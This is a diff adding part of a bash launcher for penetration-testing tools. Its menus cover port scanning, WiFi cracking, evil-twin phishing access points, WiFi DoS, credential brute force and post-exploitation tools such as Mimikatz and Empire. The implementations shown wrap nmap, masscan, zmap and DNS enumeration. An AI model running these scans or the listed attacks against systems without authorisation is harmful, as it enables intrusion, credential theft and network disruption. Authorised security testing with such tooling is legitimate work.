+        echo -e "    ${C_GHOST}[1]${C_RESET} Quick Scan          ${C_SHADOW}nmap -T4 -F${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} Full Scan           ${C_SHADOW}nmap -sS -sV -sC -A -p-${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} Stealth Scan        ${C_SHADOW}nmap -sS -T2 -f${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} Vuln Scan           ${C_SHADOW}nmap --script vuln${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} UDP Scan            ${C_SHADOW}nmap -sU --top-ports 100${C_RESET}"
+        echo -e "    ${C_GHOST}[6]${C_RESET} Masscan             ${C_SHADOW}masscan -p1-65535 --rate=10000${C_RESET}"
+        echo -e "    ${C_GHOST}[7]${C_RESET} Service Detection   ${C_SHADOW}nmap -sV --version-intensity 5${C_RESET}"
+        echo -e "    ${C_GHOST}[8]${C_RESET} Rustscan            ${C_SHADOW}fast pre-scan + nmap${C_RESET}"
+        echo -e "    ${C_GHOST}[9]${C_RESET} Unicornscan         ${C_SHADOW}asynchronous TCP/UDP scan${C_RESET}"
+        echo -e "    ${C_GHOST}[10]${C_RESET} Zmap               ${C_SHADOW}internet-wide scan${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) get_target && run_nmap_quick ;;
+            2) get_target && run_nmap_full ;;
+            3) get_target && run_nmap_stealth ;;
+            4) get_target && run_nmap_vuln ;;
+            5) get_target && run_nmap_udp ;;
+            6) get_target && run_masscan ;;
+            7) get_target && run_nmap_service ;;
+            8) get_target && run_rustscan ;;
+            9) get_target && run_unicornscan ;;
+            10) get_target && run_zmap ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_discovery() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_VENOM}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_VENOM}║${C_RESET}                  ${C_SKULL}🔍 NETWORK DISCOVERY${C_RESET}                       ${C_VENOM}║${C_RESET}"
+        echo -e "    ${C_VENOM}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} ARP Scan            ${C_SHADOW}arp-scan -l${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} Ping Sweep          ${C_SHADOW}nmap -sn${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} Netdiscover         ${C_SHADOW}netdiscover -r${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} OS Detection        ${C_SHADOW}nmap -O${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Passive Fingerprint ${C_SHADOW}p0f${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) run_arp_scan ;;
+            2) get_target && run_ping_sweep ;;
+            3) get_target && run_netdiscover ;;
+            4) get_target && run_os_detect ;;
+            5) run_p0f ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_dns() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_GHOST}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_GHOST}║${C_RESET}                    ${C_SKULL}🌐 DNS ENUMERATION${C_RESET}                        ${C_GHOST}║${C_RESET}"
+        echo -e "    ${C_GHOST}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} DNS Enum            ${C_SHADOW}dnsenum${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} DNS Map             ${C_SHADOW}dnsmap${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} DNS Recon           ${C_SHADOW}dnsrecon${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} Zone Transfer       ${C_SHADOW}dig axfr${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Subdomain Brute     ${C_SHADOW}fierce${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) get_target && run_dnsenum ;;
+            2) get_target && run_dnsmap ;;
+            3) get_target && run_dnsrecon ;;
+            4) get_target && run_zone_transfer ;;
+            5) get_target && run_fierce ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_ssl() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_PURPLE}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_PURPLE}║${C_RESET}                    ${C_SKULL}🔐 SSL/TLS ANALYSIS${C_RESET}                       ${C_PURPLE}║${C_RESET}"
+        echo -e "    ${C_PURPLE}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} SSL Scan            ${C_SHADOW}sslscan${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} SSLyze              ${C_SHADOW}sslyze --regular${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} TestSSL             ${C_SHADOW}testssl.sh${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} Certificate Info    ${C_SHADOW}openssl s_client${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Heartbleed Check    ${C_SHADOW}nmap --script ssl-heartbleed${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) get_target && run_sslscan ;;
+            2) get_target && run_sslyze ;;
+            3) get_target && run_testssl ;;
+            4) get_target && run_cert_info ;;
+            5) get_target && run_heartbleed ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_wifi_recon() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_VENOM}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_VENOM}║${C_RESET}                     ${C_SKULL}📡 WiFi RECON${C_RESET}                            ${C_VENOM}║${C_RESET}"
+        echo -e "    ${C_VENOM}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} Scan Networks       ${C_SHADOW}airodump-ng${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} Wifite Auto         ${C_SHADOW}wifite --kill${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} Client Scan         ${C_SHADOW}airodump-ng --bssid${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} Hidden SSID         ${C_SHADOW}airodump-ng + deauth${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Signal Strength     ${C_SHADOW}wavemon / iwconfig${C_RESET}"
+        echo -e "    ${C_GHOST}[6]${C_RESET} Bettercap Recon     ${C_SHADOW}Live WiFi/ble intel${C_RESET}"
+        echo -e "    ${C_GHOST}[7]${C_RESET} Fluxion             ${C_SHADOW}Automated evil twin${C_RESET}"
+        echo -e "    ${C_GHOST}[8]${C_RESET} Wifiphisher         ${C_SHADOW}Phishing AP workflow${C_RESET}"
+        echo -e "    ${C_GHOST}[9]${C_RESET} MDK3/MDK4 DoS       ${C_SHADOW}WiFi DoS toolkit${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) cmd_wifi_scan ;;
+            2) cmd_wifite ;;
+            3) cmd_client_scan ;;
+            4) cmd_hidden_ssid ;;
+            5) cmd_signal_check ;;
+            6) cmd_bettercap_wifi ;;
+            7) cmd_fluxion ;;
+            8) cmd_wifiphisher ;;
+            9) cmd_mdk_dos ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_wifi_crack() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_BLOOD}💀 HANDSHAKE CRACKING${C_RESET}                          ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Aircrack-ng (CPU)        ${C_SHADOW}Dictionary attack${C_RESET}                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Aircrack-ng (Wordlist)   ${C_SHADOW}Custom wordlist${C_RESET}                      ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Hashcat (GPU)            ${C_SHADOW}High-speed GPU cracking${C_RESET}               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Wordlist + rules${C_RESET}                      ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Convert to Hashcat       ${C_SHADOW}cap → hccapx/hc22000${C_RESET}                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} John the Ripper          ${C_SHADOW}Alternative CPU cracker${C_RESET}               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[7]${C_RESET} Cowpatty                 ${C_SHADOW}WPA/WPA2 PSK offline${C_RESET}                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+
+        case "$choice" in
+            1) cmd_aircrack_dict ;;
+            2) cmd_aircrack_wordlist ;;
+            3) cmd_hashcat_gpu ;;
+            4) cmd_hashcat_rules ;;
+            5) cmd_convert_hashcat ;;
+            6) cmd_john_the_ripper ;;
+            7) cmd_cowpatty ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_evil_twin() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_PURPLE}👿 EVIL TWIN ATTACK${C_RESET}                         ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Scan for targets         ${C_SHADOW}Find APs to clone${C_RESET}                    ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Create Evil Twin         ${C_SHADOW}Clone target AP${C_RESET}                       ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Captive Portal           ${C_SHADOW}Phishing login page${C_RESET}                   ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Karma Attack             ${C_SHADOW}Respond to all probes${C_RESET}                 ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Deauth Original          ${C_SHADOW}Force clients to rogue AP${C_RESET}               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} Stop Attack              ${C_SHADOW}Kill all rogue processes${C_RESET}               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+
+        case "$choice" in
+            1) cmd_evil_twin_scan ;;
+            2) cmd_evil_twin_create ;;
+            3) cmd_captive_portal ;;
+            4) cmd_karma_attack ;;
+            5) cmd_deauth ;;
+            6) cmd_evil_twin_stop ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_web() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_BLOOD}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_BLOOD}║${C_RESET}                    ${C_SKULL}🌐 WEB ATTACKS${C_RESET}                            ${C_BLOOD}║${C_RESET}"
+        echo -e "    ${C_BLOOD}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} Nikto Scan          ${C_SHADOW}nikto -h${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} WordPress Scan      ${C_SHADOW}wpscan --url${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} Directory Brute     ${C_SHADOW}gobuster dir${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} FFUF Fuzzing        ${C_SHADOW}ffuf -u -w${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Burp Suite          ${C_SHADOW}burpsuite${C_RESET}"
+        echo -e "    ${C_GHOST}[6]${C_RESET} SQL Injection       ${C_SHADOW}sqlmap --wizard${C_RESET}"
+        echo -e "    ${C_GHOST}[7]${C_RESET} Nuclei              ${C_SHADOW}Fast vuln scanner${C_RESET}"
+        echo -e "    ${C_GHOST}[8]${C_RESET} httpx               ${C_SHADOW}HTTP probing${C_RESET}"
+        echo -e "    ${C_GHOST}[9]${C_RESET} Subfinder           ${C_SHADOW}Subdomain discovery${C_RESET}"
+        echo -e "    ${C_GHOST}[10]${C_RESET} Amass              ${C_SHADOW}Attack surface mapping${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) get_target && run_nikto ;;
+            2) get_target && run_wpscan ;;
+            3) get_target && run_gobuster ;;
+            4) get_target && run_ffuf ;;
+            5) run_burpsuite ;;
+            6) cmd_sqlmap ;;
+            7) get_target && run_nuclei ;;
+            8) get_target && run_httpx ;;
+            9) get_target && run_subfinder ;;
+            10) get_target && run_amass ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_osint() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_GHOST}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_GHOST}║${C_RESET}                    ${C_SKULL}🔎 OSINT RECON${C_RESET}                            ${C_GHOST}║${C_RESET}"
+        echo -e "    ${C_GHOST}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
+        echo -e "    ${C_GHOST}[1]${C_RESET} theHarvester        ${C_SHADOW}Email, subdomain harvesting${C_RESET}"
+        echo -e "    ${C_GHOST}[2]${C_RESET} Recon-ng            ${C_SHADOW}Web reconnaissance framework${C_RESET}"
+        echo -e "    ${C_GHOST}[3]${C_RESET} Shodan Search       ${C_SHADOW}Internet device search${C_RESET}"
+        echo -e "    ${C_GHOST}[4]${C_RESET} Whois Lookup        ${C_SHADOW}Domain registration info${C_RESET}"
+        echo -e "    ${C_GHOST}[5]${C_RESET} Google Dork         ${C_SHADOW}Advanced search queries${C_RESET}"
+        echo
+        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1) get_target && run_theharvester ;;
+            2) run_reconng ;;
+            3) get_target && run_shodan ;;
+            4) get_target && run_whois ;;
+            5) cmd_google_dork ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_session() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_FIRE}📁 SESSION MANAGEMENT${C_RESET}                         ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Start New Session        ${C_SHADOW}Begin new engagement${C_RESET}                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Resume Session           ${C_SHADOW}Continue previous work${C_RESET}               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Session Status           ${C_SHADOW}View current progress${C_RESET}                ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Add Notes                ${C_SHADOW}Document findings${C_RESET}                    ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Export Session           ${C_SHADOW}Package for reporting${C_RESET}                 ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} List All Sessions        ${C_SHADOW}Browse history${C_RESET}                      ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+
+        case "$choice" in
+            1) session_start ;;
+            2) session_resume ;;
+            3) session_status ;;
+            4) session_notes ;;
+            5) session_export ;;
+            6) session_list ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_creds() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_FIRE}🔑 CREDENTIAL ATTACKS${C_RESET}                       ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Hashcat (GPU)            ${C_SHADOW}Offline cracking${C_RESET}                    ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Rule-based attacks${C_RESET}                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} John the Ripper          ${C_SHADOW}CPU cracking${C_RESET}                        ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Hydra                    ${C_SHADOW}Online brute force${C_RESET}                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Medusa                   ${C_SHADOW}Parallel login attacks${C_RESET}              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} CrackMapExec             ${C_SHADOW}AD/SMB spray${C_RESET}                       ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+
+        case "$choice" in
+            1) cmd_hashcat_gpu ;;
+            2) cmd_hashcat_rules ;;
+            3) cmd_john_the_ripper ;;
+            4) cmd_hydra_bruteforce ;;
+            5) cmd_medusa_bruteforce ;;
+            6) cmd_crackmapexec ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+menu_post_exploit() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_PURPLE}🧠 POST-EXPLOITATION${C_RESET}                      ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Empire                  ${C_SHADOW}PowerShell C2${C_RESET}                       ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Covenant                ${C_SHADOW}C# C2 platform${C_RESET}                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Mimikatz (impacket)     ${C_SHADOW}Credential extraction${C_RESET}             ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Impacket Scripts        ${C_SHADOW}Remote exec toolkit${C_RESET}                ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+
+        case "$choice" in
+            1) cmd_empire ;;
+            2) cmd_covenant ;;
+            3) cmd_mimikatz ;;
+            4) cmd_impacket_scripts ;;
+            0) return ;;
+            *) log_error "Invalid selection" ;;
+        esac
+        pause
+    done
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - SCANNING
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_nmap_quick() {
+    check_tool "nmap" || return 1
+    log_attack "Quick scan on $TARGET"
+    echo
+    nmap -T4 -F -oN "${OUTPUT_FILE}_quick.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_quick.txt"
+}
+
+run_nmap_full() {
+    check_tool "nmap" || return 1
+    require_root || return 1
+    log_attack "Full scan on $TARGET (this may take a while)"
+    echo
+    nmap -sS -sV -sC -A -p- -oN "${OUTPUT_FILE}_full.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_full.txt"
+}
+
+run_nmap_stealth() {
+    check_tool "nmap" || return 1
+    require_root || return 1
+    log_attack "Stealth scan on $TARGET"
+    echo
+    nmap -sS -T2 -f --data-length 24 -oN "${OUTPUT_FILE}_stealth.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_stealth.txt"
+}
+
+run_nmap_vuln() {
+    check_tool "nmap" || return 1
+    log_attack "Vulnerability scan on $TARGET"
+    echo
+    nmap --script vuln -oN "${OUTPUT_FILE}_vuln.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_vuln.txt"
+}
+
+run_nmap_udp() {
+    check_tool "nmap" || return 1
+    require_root || return 1
+    log_attack "UDP scan on $TARGET"
+    echo
+    nmap -sU --top-ports 100 -oN "${OUTPUT_FILE}_udp.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_udp.txt"
+}
+
+run_nmap_service() {
+    check_tool "nmap" || return 1
+    log_attack "Service detection on $TARGET"
+    echo
+    nmap -sV --version-intensity 5 -oN "${OUTPUT_FILE}_services.txt" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_services.txt"
+}
+
+run_rustscan() {
+    check_tool "rustscan" || return 1
+    log_attack "Rustscan fast scan on $TARGET"
+    echo
+    rustscan -a "$TARGET" --ulimit 5000 -- -sV -oN "${OUTPUT_FILE}_rustscan.txt" | tee -a "${LOG_DIR}/rustscan.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_rustscan.txt"
+}
+
+run_unicornscan() {
+    check_tool "unicornscan" || return 1
+    log_attack "Unicornscan on $TARGET"
+    echo
+    unicornscan -Iv -p 1-65535 "$TARGET" | tee "${OUTPUT_FILE}_unicornscan.txt"
+    log_loot "Results saved: ${OUTPUT_FILE}_unicornscan.txt"
+}
+
+run_zmap() {
+    check_tool "zmap" || return 1
+    require_root || return 1
+    echo -ne "    ${C_GHOST}Port to scan [80]: ${C_RESET}"
+    read -r zmap_port
+    zmap_port="${zmap_port:-80}"
+    echo -ne "    ${C_GHOST}Rate limit (pps) [10000]: ${C_RESET}"
+    read -r zmap_rate
+    zmap_rate="${zmap_rate:-10000}"
+    log_attack "Zmap scan on $TARGET port ${zmap_port}"
+    echo
+    zmap -p "$zmap_port" "$TARGET" -r "$zmap_rate" -o "${OUTPUT_FILE}_zmap.txt" | tee -a "${LOG_DIR}/zmap.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_zmap.txt"
+}
+
+run_masscan() {
+    check_tool "masscan" || return 1
+    require_root || return 1
+    echo -ne "    ${C_GHOST}Rate (default 10000): ${C_RESET}"
+    read -r rate
+    rate="${rate:-10000}"
+    log_attack "Masscan on $TARGET @ rate $rate"
+    echo
+    masscan -p1-65535 --rate="$rate" -oL "${OUTPUT_FILE}_masscan.txt" "$TARGET" | tee -a "${LOG_DIR}/masscan.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_masscan.txt"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - DISCOVERY
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_arp_scan() {
+    check_tool "arp-scan" || return 1
+    require_root || return 1
+    log_info "Running ARP scan on local network"
+    echo
+    arp-scan -l | tee -a "${LOG_DIR}/arp-scan.log"
+}
+
+run_ping_sweep() {
+    check_tool "nmap" || return 1
+    log_info "Ping sweep on $TARGET"
+    echo
+    nmap -sn "$TARGET" | tee -a "${LOG_DIR}/discovery.log"
+}
+
+run_netdiscover() {
+    check_tool "netdiscover" || return 1
+    require_root || return 1
+    log_info "Running netdiscover on $TARGET"
+    echo
+    timeout 30 netdiscover -r "$TARGET" -P | tee -a "${LOG_DIR}/netdiscover.log"
+}
+
+run_os_detect() {
+    check_tool "nmap" || return 1
+    require_root || return 1
+    log_info "OS detection on $TARGET"
+    echo
+    nmap -O "$TARGET" | tee -a "${LOG_DIR}/os-detect.log"
+}
+
+run_p0f() {
+    check_tool "p0f" || return 1
+    require_root || return 1
+    get_interface || return 1
+    log_info "Starting passive fingerprinting on $IFACE (Ctrl+C to stop)"
+    echo
+    p0f -i "$IFACE" | tee -a "${LOG_DIR}/p0f.log"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - DNS
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_dnsenum() {
+    check_tool "dnsenum" || return 1
+    log_info "DNS enumeration on $TARGET"
+    echo
+    dnsenum "$TARGET" | tee -a "${LOG_DIR}/dns.log"
+}
+
+run_dnsmap() {
+    check_tool "dnsmap" || return 1
+    log_info "DNS mapping on $TARGET"
+    echo
+    dnsmap "$TARGET" | tee -a "${LOG_DIR}/dns.log"
+}
